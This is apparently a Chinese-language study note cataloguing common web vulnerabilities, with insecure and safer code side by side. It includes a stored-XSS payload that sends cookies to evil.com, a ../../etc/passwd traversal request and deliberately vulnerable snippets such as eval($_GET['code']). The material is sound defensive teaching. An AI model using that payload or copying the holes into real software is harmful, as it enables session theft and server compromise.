
# 常见的高危Web安全漏洞

`#前端安全` `#R1` 


## 目录
<!-- toc -->
 ## 1. SQL 注入 (SQL Injection) 

### 1.1. 危害级别：严重

- 可直接访问/操作数据库
- 可能导致数据泄露
- 可能导致数据被篡改

### 1.2. 示例漏洞代码：

```php
// 不安全的查询
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// 安全的查询（使用参数化）
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

## 2. 远程代码执行 (RCE - Remote Code Execution)

### 2.1. 危害级别：严重

- 可在服务器上执行任意代码
- 可能导致服务器被完全控制

### 2.2. 示例漏洞代码：

```php
// 危险的代码
eval($_GET['code']);

// 不安全的系统命令执行
system("ping " . $_GET['ip']);
```

## 3. 文件包含漏洞 (File Inclusion)

### 3.1. 本地文件包含 (LFI)

```php
// 危险的包含
include($_GET['page'] . ".php");

// 可能导致敏感文件泄露
/index.php?page=../../../etc/passwd
```

### 3.2. 远程文件包含 (RFI)

```php
// 危险的远程包含
include("http://" . $_GET['url']);
```

## 4. 跨站脚本 (XSS - Cross-Site Scripting)

### 4.1. 反射型 XSS

```html
<!-- 不安全的输出 -->
<div>Welcome <?php echo $_GET['name']; ?></div>

<!-- 安全的输出 -->
<div>Welcome <?php echo htmlspecialchars($_GET['name']); ?></div>
```

### 4.2. 存储型 XSS

```javascript
// 数据库中存储的恶意脚本
<script>
    new Image().src = 'http://evil.com/steal.php?cookie=' + document.cookie;
</script>
```

### 4.3. DOM型 XSS

```javascript
// 不安全的 DOM 操作
document.getElementById('div').innerHTML = location.hash.substring(1);
```

## 5. 文件上传漏洞

### 5.1. 危害级别：高

- **可上传恶意文件**
- **可能导致代码执行**

### 5.2. 示例：

```php
// 不安全的文件上传
move_uploaded_file($_FILES['file']['tmp_name'], 
                  '/uploads/' . $_FILES['file']['name']);

// 安全的文件上传
$allowed = ['jpg', 'png', 'gif'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (in_array($ext, $allowed)) {
    // 处理上传
}
```

## 6. SSRF (Server-Side Request Forgery)

### 6.1. 危害级别：高

- 可访问内网资源
- 可绕过防火墙

### 6.2. 示例：

```php
// 不安全的实现
$url = $_GET['url'];
$content = file_get_contents($url);

// 安全的实现
$allowedHosts = ['api.example.com'];
$host = parse_url($url, PHP_URL_HOST);
if (in_array($host, $allowedHosts)) {
    $content = file_get_contents($url);
}
```

## 7. 反序列化漏洞

### 7.1. 危害级别：高

- 可能导致代码执行
- 可能导致数据泄露

### 7.2. 示例：

```php
// 不安全的反序列化
$data = unserialize($_GET['data']);

// 安全的实现
$data = json_decode($_GET['data'], true);
```

## 8. 权限控制缺陷

### 8.1. 越权访问

```php
// 不安全的实现
$userId = $_GET['id'];
$data = getUserData($userId);

// 安全的实现
if (isAuthorized($currentUser, $userId)) {
    $data = getUserData($userId);
}
```

### 8.2. 未授权访问

```php
// 需要添加认证检查
function adminPanel() {
    if (!isAdmin()) {
        die('Unauthorized');
    }
    // 管理面板代码
}
```

## 9. 安全配置错误

### 9.1. 敏感信息泄露

```nginx
# 不安全的 Nginx 配置
location ~ \.git {
    # 没有限制访问
}

# 安全的配置
location ~ \.git {
    deny all;
}
```

### 9.2. 默认配置

```apache
# 危险的 Apache 配置
Options Indexes FollowSymLinks
# 显示目录列表
```

## 10. 敏感信息泄露

### 10.1. 接口响应中的敏感数据

```json
// 不安全的接口响应
{
    "username": "zhang_san",
    "mobile": "13800138000",
    "idCard": "310123199001011234",  // 身份证号
    "bankCard": "6222021234567890",  // 银行卡号
    "password": "md5_hash",          // 密码哈希
    "salt": "abc123",                // 密码盐值
    "sessionToken": "xyz789"         // 会话令牌
}

// 安全的接口响应
{
    "username": "zhang_san",
    "mobile": "138****8000",         // 脱敏处理
    "idCard": "310123********1234",  // 脱敏处理
    "bankCard": "6222**********7890" // 脱敏处理
}
```

### 10.2. 错误信息泄露

```javascript
// 不安全的错误响应
{
    "error": "Database connection failed: mysql://root:password@localhost:3306/db",
    "stackTrace": "详细的堆栈信息...",
    "sqlQuery": "SELECT * FROM users WHERE id = 123"
}

// 安全的错误响应
{
    "error": "System error",
    "code": "DB_001",
    "requestId": "req_abc123"  // 用于日志追踪
}
```

## 11. 接口安全漏洞

### 11.1. 接口未授权访问

```javascript
// 不安全的接口
app.get('/api/user/info', (req, res) => {
    const userId = req.query.id;
    return getUserInfo(userId);
});

// 安全的接口
app.get('/api/user/info', authenticate, (req, res) => {
    const userId = req.user.id;  // 只能访问自己的信息
    return getUserInfo(userId);
});
```

### 11.2. 批量请求漏洞

```javascript
// 可能导致信息泄露的批量查询
app.post('/api/users/batch', (req, res) => {
    const userIds = req.body.ids;
    return getAllUsersInfo(userIds);  // 可能被用来枚举用户信息
});

// 安全的实现
app.post('/api/users/batch', authenticate, (req, res) => {
    const userIds = req.body.ids;
    if (userIds.length > 100) {
        return res.status(400).json({ error: 'Too many requests' });
    }
    // 检查权限
    if (!canAccessUsers(req.user, userIds)) {
        return res.status(403).json({ error: 'Forbidden' });
    }
    return getAllUsersInfo(userIds);
});
```

### 11.3. 接口频率限制缺失

```javascript
// 添加速率限制中间件
const rateLimit = require('express-rate-limit');

const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15分钟
    max: 100,  // 限制每个IP 100次请求
    message: 'Too many requests from this IP'
});

app.use('/api/', apiLimiter);
```

## 12. 业务逻辑漏洞

### 12.1. 订单金额篡改

```javascript
// 不安全的订单处理
app.post('/api/order', (req, res) => {
    const { productId, price, quantity } = req.body;
    const total = price * quantity;  // 直接使用前端传来的价格
});

// 安全的订单处理
app.post('/api/order', (req, res) => {
    const { productId, quantity } = req.body;
    const product = await Product.findById(productId);
    const total = product.price * quantity;  // 使用后端查询的价格
});
```

### 12.2. 越权操作

>  比如 `companyId` 为 0,1,2，我暴力遍历之

```javascript
// 不安全的数据访问
app.get('/api/company/:companyId/employees', (req, res) => {
    const employees = await Employee.find({
        companyId: req.params.companyId
    });
    return employees;
});

// 安全的数据访问
app.get('/api/company/:companyId/employees', authenticate, (req, res) => {
    // 检查用户是否有权限访问该公司数据
    if (!await hasCompanyAccess(req.user, req.params.companyId)) {
        return res.status(403).json({ error: 'Forbidden' });
    }
    const employees = await Employee.find({
        companyId: req.params.companyId
    });
    return employees;
});
```

## 13. 配置和环境安全

### 13.1. 环境变量泄露

```javascript
// 不安全的配置接口
app.get('/api/config', (req, res) => {
    return {
        dbUrl: process.env.DB_URL,
        apiKeys: process.env.API_KEYS,
        secretKey: process.env.SECRET_KEY
    };
});

// 安全的配置接口
app.get('/api/config', (req, res) => {
    return {
        apiVersion: '1.0',
        environment: process.env.NODE_ENV,
        features: ['feature1', 'feature2']
    };
});
```

### 13.2. 调试信息泄露

```javascript
// 生产环境禁用调试信息
if (process.env.NODE_ENV === 'production') {
    app.set('env', 'production');
    app.disable('x-powered-by');
    app.use(morgan('combined'));  // 使用简化的日志
} else {
    app.use(morgan('dev'));      // 开发环境使用详细日志
}
```

## 14. 防护建议

### 14.1. 数据脱敏处理

```javascript
// 通用脱敏函数
function maskSensitiveData(data, type) {
    switch(type) {
        case 'mobile':
            return data.replace(/(\d{3})\d{4}(\d{4})/, '$1****$2');
        case 'idCard':
            return data.replace(/(\d{6})\d{8}(\d{4})/, '$1********$2');
        case 'email':
            return data.replace(/(.{3}).*(@.*)/, '$1***$2');
        // 更多类型...
    }
}
```

### 14.2. 响应数据过滤

```javascript
// 过滤敏感字段
function filterSensitiveFields(data) {
    const sensitiveFields = ['password', 'salt', 'token', 'secretKey'];
    if (typeof data === 'object') {
        return Object.keys(data).reduce((acc, key) => {
            if (!sensitiveFields.includes(key)) {
                acc[key] = data[key];
            }
            return acc;
        }, {});
    }
    return data;
}
```

### 14.3. 接口访问控制

```javascript
// 访问控制中间件
function accessControl(resource) {
    return async (req, res, next) => {
        const user = req.user;
        const resourceId = req.params.id;
        
        try {
            const hasAccess = await checkAccess(user, resource, resourceId);
            if (!hasAccess) {
                return res.status(403).json({
                    error: 'Access denied',
                    code: 'FORBIDDEN'
                });
            }
            next();
        } catch (error) {
            next(error);
        }
    };
}
```

### 14.4. 日志审计

```javascript
// 审计日志中间件
function auditLog(req, res, next) {
    const startTime = Date.now();
    
    // 响应完成后记录日志
    res.on('finish', () => {
        const duration = Date.now() - startTime;
        logger.info({
            method: req.method,
            path: req.path,
            userId: req.user?.id,
            ip: req.ip,
            duration,
            status: res.statusCode
        });
    });
    
    next();
}
```

### 14.5. 安全检查清单

1. 检查所有接口的授权要求
2. 实施数据访问控制
3. 对敏感数据进行脱敏处理
4. 实施接口调用频率限制
5. 记录关键操作审计日志
6. 定期进行安全测试
7. 监控异常访问模式
8. 实施数据加密传输
9. 配置适当的CORS策略
10. 使用HTTPS传输

